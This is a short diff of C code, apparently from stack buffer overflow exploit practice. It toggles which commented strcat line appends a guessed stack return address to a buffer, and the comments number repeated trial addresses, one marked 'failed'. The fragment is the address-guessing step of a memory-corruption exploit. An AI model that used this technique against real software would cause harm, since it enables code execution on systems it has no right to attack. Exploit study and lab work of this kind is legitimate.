@@ -34,13 +34,13 @@ int main(void)
     // - 151
   	// strcat(str, "\x6f\xfb\xff\xbf");
     // - 152
-  	// strcat(str, "\x6e\xfb\xff\xbf");
+  	strcat(str, "\x6e\xfb\xff\xbf");
     // - 153
   	// strcat(str, "\x6d\xfb\xff\xbf");
 
     // failed
     // - 154
-  	strcat(str, "\x6c\xfb\xff\xbf");
+  	// strcat(str, "\x6c\xfb\xff\xbf");
 
 
     // bffffbd4
